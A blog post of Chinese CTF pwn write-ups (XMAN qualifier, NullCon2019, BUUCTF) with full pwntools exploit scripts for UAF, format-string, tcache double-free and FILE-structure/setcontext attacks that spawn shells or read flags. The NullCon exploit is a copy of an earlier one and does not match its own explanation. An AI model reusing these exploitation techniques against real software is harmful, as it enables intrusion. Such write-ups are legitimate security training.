---
title: xman冬令营/NullCon2019/BUUCTF 部分pwn writeup
categories:
- CTF writeup
---

# xman冬令营/NullCon2019/BUUCTF 部分pwn writeup

## xman冬令营选拔赛

### 前言

一共四个题，kernel放弃了，arm本地通了远程失败，format最后队友出了就懒得调了。

### nosyscall

#### 程序分析

逻辑很简单，可以写0x10的shellcode并执行，禁了所有的系统调用，开始flag读到了一个mmap的地址里，这里用`cmp`爆破，正确就报错EOF否则回到开头死循环卡住。

```c
__int64 __fastcall main(__int64 a1, char **a2, char **a3)
{
  void *v3; // ST10_8
  void *buf; // ST18_8
  FILE *v6; // [rsp+8h] [rbp-28h]

  sub_B91();
  v6 = fopen("./flag.txt", "r");
  if ( !v6 )
    exit(1);
  v3 = mmap((void *)0x200000000LL, 0x2000uLL, 3, 34, -1, 0LL);
  buf = mmap((void *)0x300000000LL, 0x20000uLL, 7, 34, -1, 0LL);
  _isoc99_fscanf(v6, "%s", v3);
  printf("Your Shellcode >>", "%s");
  read(0, buf, 0x10uLL);
  sub_C34();
  ((void (__fastcall *)(_QWORD, void *))buf)(0LL, buf);
  return 0LL;
}
```

#### exp.py

遇到EOF手动ctrl+z，进入死循环ctrl+c，之后手动加下dis

```py
#coding=utf-8
from pwn import *
import string
from time import sleep
context.update(arch='amd64',os='linux',log_level='DEBUG')
context.terminal = ['tmux','split','-h']
debug = 0
elf = ELF('./chall')
bak = '{}_'+string.ascii_lowercase + string.digits
libc_offset = 0x3c4b20
gadgets = [0x45216,0x4526a,0xf02a4,0xf1147]
if debug:
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    p = process('./chall')

else:
    libc = ELF('./x64_libc.so.6')
    p = remote('121.36.64.245',10003)


def exp(char,dis):
    #leak libc
    #sc = asm(shellcraft.amd64.linux.sh())
    #sc= "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
    p.recvuntil("Your Shellcode >>")
    #gdb.attach(p,'b* 0x0000555555554000+0xd87')
    #
    sc = asm("L1:mov bl,"+str(ord(char))+";"+"mov rdx,[rsp+0x18];"+'mov rdx,[rdx+'+str(dis)+'];'+'cmp bl,dl;jz L1')
    p.send(sc)

count = 0
dis = 0
def my_exit(signum,frame):
    print str(dis+1)+" char is " + bak[count]
    sys.exit()

def err_exit(signum,frame):
    if debug:
        libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
        p = process('./chall')
    else:
        p = remote('121.36.64.245',10003)
    print count
    print bak[count]
    exp(bak[count],dis)
    count += 1
    p.interactive()
    p.close()

while True:
    signal.signal(signal.SIGINT,my_exit)
    signal.signal(signal.SIGTSTP, err_exit)
    total = len(bak)
    try:
        print count
        print bak[count]
        exp(bak[count],dis)
        count += 1
        p.interactive()
        p.close()
    except Exception as e:
        p.close()

    if debug:
        libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
        p = process('./chall')
    else:
        p = remote('121.36.64.245',10003)

```

### arm

#### 前言

题目很简单，主要记录一下arm pwn的一般做题方式。

#### 程序分析

可以add、del、print、edit，有UAF，是最简单的题了，题目本身就不再多说了，在`name`构造好一个fake chunk，malloc一个0xa0的块释放泄露libc，UAF到`name`进而可以Edit到notelist写入free_hook，再Edit即可改成system。

#### 调试环境搭建

查到了两篇比较详细的介绍，分别是[arm32](https://xz.aliyun.com/t/3744)以及[arm64](https://xz.aliyun.com/t/3154)，可以用`qemu-arm -L /usr/arm-linux-gnueabi ./pwn`启动或者`socat tcp-l:10002,fork exec:"qemu-arm -g 1234 -L /usr/arm-linux-gnueabi ./pwn",reuseaddr`用socat启动gdb attach上去。后者我调试发现有gdb server无法启动的问题，所以作罢了。  
最后的解决方法是在exp.py里用` p = process(["qemu-arm", "-L", "/usr/arm-linux-gnueabihf", "./pwn"])`启动，之后开另一个终端用`gdb -q ./pwn`再查看这个进程的pid，在gdb内部`attach [pid]`进行调试，因为我们调试的是`qemu-arm`所以地址都是外层的，内层地址看不到。  
开始泄露libc的时候我是启动时候加了`-g`参数直接在gdb里删除了一个大的块查看偏移，之后再用`exp.py`里调试。

#### exp.py

```py
from pwn import *


context.log_level = 'debug'


def add(p, size, content):
    p.sendlineafter('your choice: ', str(1))
    p.sendlineafter('Note size :', str(size))
    p.sendafter("Content :",content)


def delete(p, idx):
    p.sendlineafter('your choice: ', str(2))
    p.sendlineafter('Index :', str(idx))


def show(p, idx):
    p.sendlineafter('your choice: ', str(3))
    p.sendlineafter('Index :', str(idx))

def edit(p, idx, content):
    p.sendlineafter('your choice: ', str(5))
    p.sendlineafter('Index :', str(idx))
    p.sendafter("You content:",content)

debug = 1

def pwn():
    context.terminal = ['tmux', 'split', '-h']
    context.binary = './pwn'
    elf = ELF('./pwn')
    if not debug:
        p = remote("172.16.9.45", 10623)
        libc = ELF('./libc.so.6')
    elif debug == 1:
        p = process(["qemu-arm", "-L", "/usr/arm-linux-gnueabihf", "./pwn"])
        libc = ELF('/usr/arm-linux-gnueabihf/lib/libc.so.6')
    elif debug == 2:
        p = remote("127.0.0.1",12345)
        #pause()
    else:
        p = process(["qemu-arm", "-g", "1234", "-L", "/usr/arm-linux-gnueabihf", "./pwn"])
        libc = ELF('/usr/arm-linux-gnueabihf/lib/libc.so.6')
        sleep(1)
    name_lis = 0x21068
    pause()
    p.sendlineafter("Tell me your name:",p32(0x21)*8)
    add(p,0xa0,'012345678')
    add(p,0x18,'1')
    add(p,0x18,'2')
    add(p,0x18,'/bin/sh\x00')
    delete(p,0)
    #gdb.attach(p)
    show(p,0)
    libc_base = u32(p.recv(4)) - 0xe87cc
    log.success("libc base => " + hex(libc_base))

    free_addr = libc_base + libc.sym['__free_hook']
    system_addr = libc_base + libc.sym['system']
    #get shell
    delete(p,1)

    edit(p,1,p32(name_lis+0x18))
    add(p,0x18,'4')


    payload = p32(0)*2+p32(free_addr)
    add(p,0x18,payload)

    edit(p,2,p32(system_addr))
    delete(p,3)
    p.interactive()
    p.close()


if __name__ == "__main__":
    pwn()

```

### format

#### 程序分析

似乎也没什么说的，嵌套了好几层函数，我的exp是改的`one_gadget`本地通了数据太多远程挂了，后来发现有后门，就更简单了，队友出了也懒得改了。

#### exp.py

```py
#coding=utf-8
from pwn import *
context.update(arch='i386',os='linux',log_level='info')
context.terminal = ['tmux','split','-h']
debug = 0
elf = ELF('./chall')
gadgets = [0x3ac5c,0x3ac5e,0x3ac62,0x3ac69,0x5fbc5,0x5fbc6]
libc = ELF('/lib/i386-linux-gnu/libc.so.6')
if debug:

    p = process('./chall')
else:
    p = remote('119.3.172.70',10005)

def MyPrint(payload):
    p.recvuntil("...")
    p.send(payload)

def exp():
    #leak libc
    payload = "%43$p|%10$p|"
    payload += "%"+str(0x3c)+"c%10$hhn|"
    payload += "%"+str(0x9d)+"c%18$hhn"
    MyPrint(payload)
    p.recvuntil("0x")
    libc_base = int(p.recv(8),16) - 247 - libc.sym['__libc_start_main']
    log.success("libc base => " + hex(libc_base))
    #leak stack
    p.recvuntil("0x")
    retn_addr = int(p.recv(8),16) - 0x20 + 4 + 0x64 - 0xc0
    log.success("retn addr => " + hex(retn_addr))
    #get shell

    shell_addr = libc_base + gadgets[1]
    print hex(shell_addr)
    #gdb.attach(p)
    raw_input()
    #gdb.attach(p,'b* 0x08048627')
    low = shell_addr & 0xffff
    high= shell_addr >> 16
    payload = "%"+str(retn_addr&0xffff)+"c%10$hn|"
    payload += "%"+str(low)+"c%18$hn|"
    payload += "%"+str((retn_addr+2)&0xff)+"c%10$hhn|"
    payload += "%"+str(high)+"c%18$hn"
    MyPrint(payload)


while True:
    try:
        exp()
        p.interactive()
        p.close()
    except:
        p.close()
    libc = ELF('/lib/i386-linux-gnu/libc.so.6')
    if debug == 1:
        p = process('./chall')
    else:
        p = remote('119.3.172.70',10005)

```

## NullCon2019 babypwn

### 前言

其实只有一道题，记一下`scanf`的性质，即遇到`+`/`-`输入会直接`ret`即不会将数据输入其中直接跳过，也不会崩溃。

### 程序逻辑

先格式化字符串漏洞后栈溢出，输入使用的是`scanf`，第一次泄露libc之后拿`scanf`绕过`canary`改返回地址回`main`再get shell

### exp.py

```py
#coding=utf-8
from pwn import *
context.update(arch='i386',os='linux',log_level='info')
context.terminal = ['tmux','split','-h']
debug = 0
elf = ELF('./chall')
gadgets = [0x3ac5c,0x3ac5e,0x3ac62,0x3ac69,0x5fbc5,0x5fbc6]
libc = ELF('/lib/i386-linux-gnu/libc.so.6')
if debug:

    p = process('./chall')
else:
    p = remote('119.3.172.70',10005)

def MyPrint(payload):
    p.recvuntil("...")
    p.send(payload)

def exp():
    #leak libc
    payload = "%43$p|%10$p|"
    payload += "%"+str(0x3c)+"c%10$hhn|"
    payload += "%"+str(0x9d)+"c%18$hhn"
    MyPrint(payload)
    p.recvuntil("0x")
    libc_base = int(p.recv(8),16) - 247 - libc.sym['__libc_start_main']
    log.success("libc base => " + hex(libc_base))
    #leak stack
    p.recvuntil("0x")
    retn_addr = int(p.recv(8),16) - 0x20 + 4 + 0x64 - 0xc0
    log.success("retn addr => " + hex(retn_addr))
    #get shell

    shell_addr = libc_base + gadgets[1]
    print hex(shell_addr)
    #gdb.attach(p)
    raw_input()
    #gdb.attach(p,'b* 0x08048627')
    low = shell_addr & 0xffff
    high= shell_addr >> 16
    payload = "%"+str(retn_addr&0xffff)+"c%10$hn|"
    payload += "%"+str(low)+"c%18$hn|"
    payload += "%"+str((retn_addr+2)&0xff)+"c%10$hhn|"
    payload += "%"+str(high)+"c%18$hn"
    MyPrint(payload)


while True:
    try:
        exp()
        p.interactive()
        p.close()
    except:
        p.close()
    libc = ELF('/lib/i386-linux-gnu/libc.so.6')
    if debug == 1:
        p = process('./chall')
    else:
        p = remote('119.3.172.70',10005)

```

## BUUCTF

### ciscn_2019_sw_5/ciscn_2019_nw_2

### 程序逻辑

libc-2.27，固定分配`0x70`(chunk大小为`0x80`)只能free`3`次，但malloc之后会输出一次数据，输入技巧题。

### 漏洞利用

先double free，分配到`tcache_struct`里`0x80`对应的位置(需要爆破`1/16`)，构造一个tcache chain出来，比如我这里是往里写一个`*2b0`而`*2b0`后面跟着`*2e0`，进而得到一个`*2b0->*2e0`的链，之后分配到`*2b0`修改`*2e0`的size为`0x421`(注意后面要有一个fake_chunk的prev_in_use=1)，Free掉这个块即可得到Ub(注意此时因为fd=`main_arena+96`又出了新的链`*2e0->main_arena+96`)，再Malloc可以根据末位一定是`\xa0`分配到`*2d0`泄露libc，再分配到`main_arena+96`修改`top_chunk`到`__malloc_hook`前面，最后把刚才那个`0x420`大小的ub分配完再走`top_chunk`，最终分配到`__malloc_hook`改为`gadgets[1]`即可。

问了队友胡师傅(ID太长记不住)，有另一种解法，改tcache的块数量为`0xff`，double free用来伪造fake chunk的`size`为0x210，与此同时还能写`tcache[0x80]`这个块到`fake chunk`，之后可以分配得到这个块，再释放就到了`ub`。再分配就可以覆写tcache[0x80]到malloc_hook。

远程数据发送过快可能会粘包，所以这里加了`raw_input()`多试试就好。

### exp.py

```py
#coding=utf-8
from pwn import *
context.update(arch='amd64',os='linux',log_level='DEBUG')
context.terminal = ['tmux','split','-h']
debug = 0
elf = ELF('./ciscn_2019_sw_5')
libc_offset = 0x3c4b20
gadgets = [0x4f2c5,0x4f322,0x10a38c]
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
if debug:
    p = process('./ciscn_2019_sw_5')
else:
    p = remote('node3.buuoj.cn',28453)

def Add(title=p64(0),content=p64(0x21)*13):
    p.recvuntil('>> ')
    p.sendline('1')
    p.recvuntil("title:\n")
    p.send(title)
    p.recvuntil("content:")
    p.send(content)

def Delete(index):
    p.recvuntil('>> ')
    p.sendline('2')
    p.recvuntil("index:\n")
    p.sendline(str(index))

def Trigger():
    p.recvuntil('>> ')
    p.sendline('3'*0x5000)


def exp():
    #leak heap
    for i in range(11):
        Add()#0
    Delete(0)
    Delete(0)


    Add("\x80\x70")#10
    p.recvuntil("\x80\x70",drop=False)
    heap_base = u64(('\x80\x70'+p.recvuntil(" ",drop=True)).ljust(8,'\x00')) - 0x80
    log.success("heap base => " + hex(heap_base))

    #leak libc
    Add(p64(heap_base+0x2e0),p64(heap_base+0x2e0)*13)#11
    payload = p64(heap_base+0x2b0)
    raw_input()
    Add(payload)#11

    Add(p64(heap_base+0x2b0),p64(heap_base+0x2b0)*3+p64(0)+p64(0x421)+p64(heap_base+0x2b0)*3)
    Delete(1)

    Add('\xa0','\xa0')
    raw_input()
    p.recvuntil("\x7f\x20")
    libc_base = u64(p.recv(6).ljust(8,'\x00')) - 96 - libc.sym['__malloc_hook'] - 0x10
    log.success("libc base => " + hex(libc_base))


    Add(p64(libc_base+libc.sym["__malloc_hook"]-0x28),p64(0))
    Add(p64(libc_base+libc.sym["__free_hook"]-0x18),p64(0))
    for i in range(8):
        Add(p64(libc_base+libc.sym["__free_hook"]-0x18),p64(0))

    shell_addr = libc_base + gadgets[1]
    Add(p64(0),p64(libc_base+libc.sym['__malloc_hook'])+p64(libc.sym['__realloc_hook'])+p64(shell_addr))
    #gdb.attach(p)
    p.recvuntil('>> ')
    p.sendline('1')
    p.interactive()

exp()
```

### ciscn_final_4

#### 前言

应该是UCTF`orw_heap`的原型题，不过要求更严苛了一点

#### 程序分析

Init里禁了系统调用`execve`

题目fork了一个子进程，动作都是在子进程里执行的，父进程去执行`watch`函数，这个函数里有个循环，`ptrace(PTRACE_SYSCALL, a1, 0LL, 0LL);`会使得子进程在每次进行系统调用以及结束一次系统调用的时候都会被内核停下来。`PTRACE_GETREGS`调用将寄存器信息读取出来，往后判断的是寄存器rax的值，即判断系统调用号，这里禁了`open/mmap/fork/vfork/ptrace`这些系统调用。

```c
// local variable allocation has failed, the output may be wrong!
int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
{
  __pid_t v3; // eax
  int v4; // [rsp+8h] [rbp-118h]
  __pid_t v5; // [rsp+Ch] [rbp-114h]
  char s; // [rsp+10h] [rbp-110h]
  unsigned __int64 v7; // [rsp+118h] [rbp-8h]

  v7 = __readfsqword(0x28u);
  init(*(_QWORD *)&argc, argv, envp);
  v5 = fork();
  if ( v5 < 0 )
  {
    puts("something wrong!");
    exit(-1);
  }
  if ( v5 )
    watch((unsigned int)v5);
  prctl(1, 1LL);
  ptrace(0, 0LL, 0LL, 0LL);
  v3 = getpid();
  kill(v3, 19);
  puts("you can't call the execve syscall, so you need to find another way to get flag");
  puts("and bewared!, something is watching you !!");
  memset(&s, 0, 0x100uLL);
  puts("what is your name? ");
  read(0, &s, 0xFFuLL);
  printf("hi ! %s\n", &s);
  while ( 1 )
  {
    while ( 1 )
    {
      menu();
      _isoc99_scanf("%d", &v4);
      if ( v4 != 2 )
        break;
      delete();
    }
    if ( v4 > 2 )
    {
      if ( v4 == 3 )
      {
        mwrite();
      }
      else
      {
        if ( v4 == 4 )
          exit(0);
LABEL_18:
        puts("Invalid choice!");
      }
    }
    else
    {
      if ( v4 != 1 )
        goto LABEL_18;
      new();
    }
  }
}

void __fastcall __noreturn watch(unsigned int a1)
{
  int stat_loc; // [rsp+34h] [rbp-ECh]
  __int64 v2; // [rsp+38h] [rbp-E8h]
  char v3; // [rsp+40h] [rbp-E0h]
  __int64 v4; // [rsp+B8h] [rbp-68h]
  unsigned __int64 v5; // [rsp+118h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  wait(0LL);
  while ( 1 )
  {
    ptrace(PTRACE_SYSCALL, a1, 0LL, 0LL);
    waitpid(a1, &stat_loc, 0);
    if ( !(stat_loc & 0x7F) || (char)((char)((stat_loc & 0x7F) + 1) >> 1) > 0 || (stat_loc & 0xFF00) >> 8 != 5 )
      break;
    ptrace(PTRACE_GETREGS, a1, 0LL, &v3);
    v2 = v4;
    if ( v4 == 2 || v2 == 9 || v2 == 57 || v2 == 58 || v2 == 101 )
    {
      puts("hey! what are you doing?");
      exit(-1);
    }
  }
  exit(-1);
}

```

子进程里有`new/delete/write`等功能，存在`double free/UAF`。最多分配32个块，最大分配的size为0x1000。程序没开`PIE`。

#### 漏洞利用

为了调试先`patch`一下原程序，只留子进程方便调试。最开始是想直接HOF一把梭劫持到`setcontext+53`，patch的过了源程序崩了，因为HOF是触发erro报错，这里会调用`mmap`这个系统调用，所以直接挂了。最后还是按照之前*CTF的那道题自己伪造一个0x60的`small bin`，之后ub attack改`IO_list_all`，最终触发_IO_str_overflow等一系列的调用链进到setcontext+53，这里用mprotect修改heap权限，加上可执行，部署shellcode，因为`open`被禁了，拿`openat(0,absolute_path,0)`来`open`文件，之后r/w即可。

第二种方法是结合栈的，这种漏洞其实是很难发现的，在这里我们在malloc的时候输入的位置+`0x38`是我们输入`name`的地方，因为没有开`PIE`我们可以预先设置好`rop chains`，之后用堆漏洞改`__malloc_hook`到一个`pivot gadgets`，从而在`malloc`的时候去执行`rop chain`。这个exp就不写了233。


#### exp.py

```py
#coding=utf-8
from pwn import *
context.update(arch='amd64',os='linux',log_level='DEBUG')
context.terminal = ['tmux','split','-h']
debug = 0
elf = ELF('./ciscn_final_4')
libc_offset = 0x3c4b20
gadgets = [0x45216,0x4526a,0xf02a4,0xf1147]
if debug:
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    p = process('./ciscn_final_4')

else:
    libc = ELF('./x64_libc.so.6')
    p = remote('node3.buuoj.cn',28038)

def Add(size,content='0'):
    p.recvuntil('>> ')
    p.sendline('1')
    p.recvuntil("size?\n")
    p.sendline(str(size))
    p.recvuntil("content?\n")
    p.send(content)

def Show(index):
    p.recvuntil('>> ')
    p.sendline('3')
    p.recvuntil("index ?\n")
    p.sendline(str(index))

def Delete(index):
    p.recvuntil('>> ')
    p.sendline('2')
    p.recvuntil("index ?\n")
    p.sendline(str(index))


def exp():
    #leak libc
    p.sendlineafter("what is your name?",'123')
    Add(0x20,p64(0x21)*4)#0
    Add(0x20,p64(0x21)*4)#1
    Add(0x80,p64(0x31)*16)#2
    Add(0x20,p64(0x31)*4)#3
    Add(0x50,p64(0x31)*10)#4
    Add(0x1f0,p64(0x31)*18)#5
    Add(0x60,p64(0x21)*12)#6
    Delete(0)
    Delete(1)
    Delete(0)
    Show(0)
    #p.recvline()
    heap_base = u64(p.recvline().strip('\n').ljust(8,'\x00')) - 0x10
    log.success("heap base => " + hex(heap_base))
    Add(0x20,'\x20')#6
    Add(0x20,p64(0x31)*4)#7
    Add(0x20,p64(0x31)*4)#8


    Add(0x20,p64(0)+p64(0x161))#9

    Delete(1)
    Show(1)
    libc_base = u64(p.recvline().strip("\n").ljust(8,'\x00')) - 88 - 0x10 - libc.sym['__malloc_hook']
    log.success("libc base => " + hex(libc_base))
    Add(0x150)#10
    #Delete(10)
    #Delete(2)
    libc.address = libc_base
    IO_list_all = libc.sym['_IO_list_all']
    #Add(0x150,'a'*0x20+p64(0)+p64(0x91)+p64(0)+p64(IO_list_all-0x10))
    #Add(0x80)
    #get small bins
    Delete(3)
    Delete(0)
    Delete(3)
    Add(0x20,p64(heap_base+0xc0))#11
    Add(0x20,p64(0x31)*4)#12
    Add(0x20,p64(0x31)*4)#13

    Add(0x20,p64(0)+p64(0xa1))#14

    Delete(3)
    Add(0x30)#15
    Add(0x70)#16
    #change small bin

    Delete(13)


    Delete(10)
    Delete(13)

    Add(0x20,p64(heap_base+0xd0-0x20))#17

    Add(0x20)#18
    Add(0x20)#18



    Add(0x20,p64(0)+p64(0x311))



    Delete(10)
    Add(0x20,p64(0)+p64(0x151))
    Delete(8)
    Delete(15)

    Add(0x140,p64(0x31)*(0xa0/8)+p64(0)+p64(0x311)+p64(0)+p64(IO_list_all-0x10))
    #
    IO_str_j = libc.sym['_IO_file_jumps']+0xc0
    print hex(IO_str_j)
    setcontext = libc.sym['setcontext']+53
    map_addr = libc.sym['mprotect']
    heap_base = heap_base - 0x20
    fake_io = p64(0)*4+p64(0)+p64(heap_base)+p64(0x1000)+p64(0)+p64((heap_base+0xf0-100)/2)+p64(7)+p64(0xdadaddaaddddaaaa)*2+p64(heap_base+0x220)+p64(map_addr)+p64(0x0)*6+p64(0)+p64(0xdadaddaaddddaaaa)*6+p64(IO_str_j)+p64(setcontext)
    lis = [str(heap_base+0x228),str(heap_base+0x10),str(heap_base+0x10)]
    sc = "/flag"+"\x00"*11+asm('''
            mov rsi,{0[0]}
            xor rdi,rdi
            xor rdx,rdx
            mov rax,257
            syscall
            mov rdi,3
            mov rsi,{0[1]}
            mov rdx,48
            mov rax,0
            syscall
            mov rdi,1
            mov rsi,{0[2]}
            mov rdx,48
            mov rax,1
            syscall
            '''.format(lis))
    Add(0x300,p64(0)*4+p64(0)+p64(0x61)+p64(0)*2+fake_io+p64(0x31)+p64(heap_base+0x238)+sc)
    #gdb.attach(p,'b* setcontext+53')
    p.sendlineafter(">> ","4")
    p.interactive()

exp()

```
